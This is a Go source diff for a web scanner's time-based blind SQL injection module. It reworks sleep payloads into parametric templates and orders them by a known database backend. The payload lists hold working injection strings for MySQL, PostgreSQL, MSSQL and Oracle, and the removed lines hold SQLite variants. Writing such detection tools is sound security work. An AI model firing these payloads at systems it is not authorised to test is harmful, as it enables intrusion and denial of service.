@@ -1,68 +1,86 @@
 package sqli_time_blind
 
-// timePair represents a sleep/no-sleep payload pair for time-based blind SQLi testing.
+import (
+	"fmt"
+
+	"github.com/vigolium/vigolium/pkg/modules/infra"
+	"github.com/vigolium/vigolium/pkg/modules/modkit"
+)
+
+// prioritizeByDBMS reorders payloads so those matching a DBMS already
+// identified for this host (e.g. by the error-based module, recorded in the
+// TechRegistry) are tried first. Combined with early-exit on the first
+// confirmed pair this cuts requests sharply when the backend is known, without
+// dropping coverage if the hint turns out to be wrong.
+func prioritizeByDBMS(payloads []timePair, scanCtx *modkit.ScanContext, host string) []timePair {
+	if scanCtx == nil || scanCtx.TechStack == nil {
+		return payloads
+	}
+	known := map[string]bool{}
+	for _, t := range []string{"mysql", "postgres", "mssql", "oracle"} {
+		if scanCtx.TechStack.Has(host, infra.DBMSTechTag(t)) {
+			known[t] = true
+		}
+	}
+	if len(known) == 0 {
+		return payloads
+	}
+	first := make([]timePair, 0, len(payloads))
+	rest := make([]timePair, 0, len(payloads))
+	for _, p := range payloads {
+		if known[p.dbType] {
+			first = append(first, p)
+		} else {
+			rest = append(rest, p)
+		}
+	}
+	return append(first, rest...)
+}
+
+// timePair is a parametric time-based blind SQLi payload. The template carries a
+// %d placeholder for the sleep seconds so the scanner can request different
+// durations and verify the observed delay scales with the requested value —
+// the core false-positive defense. Only backends whose delay scales with a
+// numeric argument are included (MySQL SLEEP, PostgreSQL pg_sleep, MSSQL
+// WAITFOR, Oracle DBMS_PIPE); SQLite's RANDOMBLOB delay is not expressible in
+// seconds and cannot be scale-verified, so it is intentionally omitted here and
+// left to the error-based / boolean-blind modules.
 type timePair struct {
-	context  string // "string", "numeric", "bypass"
-	dbType   string // "mysql", "postgres", "mssql", "sqlite", "oracle"
-	sleepVal string // causes delay
-	noSleep  string // no delay (same structure)
+	context  string // "string", "numeric"
+	dbType   string // "mysql", "postgres", "mssql", "oracle"
+	template string // %d = sleep seconds
+}
+
+// render returns the payload fragment for the given sleep duration in seconds.
+// seconds==0 yields the no-delay variant.
+func (p timePair) render(seconds int) string {
+	return fmt.Sprintf(p.template, seconds)
 }
 
 // stringPayloads are payloads for string context injection points.
 var stringPayloads = []timePair{
-	// MySQL
-	{context: "string", dbType: "mysql", sleepVal: "' OR SLEEP(10)--", noSleep: "' OR SLEEP(0)--"},
-	{context: "string", dbType: "mysql", sleepVal: "' AND SLEEP(10)--", noSleep: "' AND SLEEP(0)--"},
-	// PostgreSQL
-	{context: "string", dbType: "postgres", sleepVal: "'; SELECT pg_sleep(10)--", noSleep: "'; SELECT pg_sleep(0)--"},
-	{context: "string", dbType: "postgres", sleepVal: "' OR (SELECT pg_sleep(10))::text='1'--", noSleep: "' OR (SELECT pg_sleep(0))::text='1'--"},
-	// MSSQL
-	{context: "string", dbType: "mssql", sleepVal: "'; WAITFOR DELAY '0:0:10'--", noSleep: "'; WAITFOR DELAY '0:0:0'--"},
-	{context: "string", dbType: "mssql", sleepVal: "' OR 1=1; WAITFOR DELAY '0:0:10'--", noSleep: "' OR 1=1; WAITFOR DELAY '0:0:0'--"},
-	// SQLite
-	{context: "string", dbType: "sqlite", sleepVal: "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))--", noSleep: "' AND 1=1--"},
-	// Oracle
-	{context: "string", dbType: "oracle", sleepVal: "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--", noSleep: "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',0)--"},
+	{context: "string", dbType: "mysql", template: "' OR SLEEP(%d)--"},
+	{context: "string", dbType: "mysql", template: "' AND SLEEP(%d)--"},
+	{context: "string", dbType: "postgres", template: "'; SELECT pg_sleep(%d)--"},
+	{context: "string", dbType: "postgres", template: "' OR (SELECT pg_sleep(%d))::text='1'--"},
+	{context: "string", dbType: "mssql", template: "'; WAITFOR DELAY '0:0:%d'--"},
+	{context: "string", dbType: "mssql", template: "' OR 1=1; WAITFOR DELAY '0:0:%d'--"},
+	{context: "string", dbType: "oracle", template: "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)--"},
 }
 
 // numericPayloads are payloads for numeric context injection points.
 var numericPayloads = []timePair{
-	// MySQL
-	{context: "numeric", dbType: "mysql", sleepVal: " OR SLEEP(10)--", noSleep: " OR SLEEP(0)--"},
-	{context: "numeric", dbType: "mysql", sleepVal: " AND SLEEP(10)--", noSleep: " AND SLEEP(0)--"},
-	// PostgreSQL
-	{context: "numeric", dbType: "postgres", sleepVal: "; SELECT pg_sleep(10)--", noSleep: "; SELECT pg_sleep(0)--"},
-	// MSSQL
-	{context: "numeric", dbType: "mssql", sleepVal: "; WAITFOR DELAY '0:0:10'--", noSleep: "; WAITFOR DELAY '0:0:0'--"},
-	// SQLite
-	{context: "numeric", dbType: "sqlite", sleepVal: " AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))--", noSleep: " AND 1=1--"},
-	// Oracle
-	{context: "numeric", dbType: "oracle", sleepVal: " OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--", noSleep: " OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',0)--"},
+	{context: "numeric", dbType: "mysql", template: " OR SLEEP(%d)--"},
+	{context: "numeric", dbType: "mysql", template: " AND SLEEP(%d)--"},
+	{context: "numeric", dbType: "postgres", template: "; SELECT pg_sleep(%d)--"},
+	{context: "numeric", dbType: "mssql", template: "; WAITFOR DELAY '0:0:%d'--"},
+	{context: "numeric", dbType: "oracle", template: " OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)--"},
 }
 
 // getPayloadsForValue selects appropriate payloads based on the parameter's base value.
 func getPayloadsForValue(baseValue string) []timePair {
-	if isNumericValue(baseValue) {
+	if infra.IsNumericValue(baseValue) {
 		return numericPayloads
 	}
 	return stringPayloads
-}
-
-// isNumericValue checks if a string looks like a number.
-func isNumericValue(s string) bool {
-	if s == "" {
-		return false
-	}
-	for i, c := range s {
-		if c == '-' && i == 0 {
-			continue
-		}
-		if c == '.' {
-			continue
-		}
-		if c < '0' || c > '9' {
-			return false
-		}
-	}
-	return true
 }
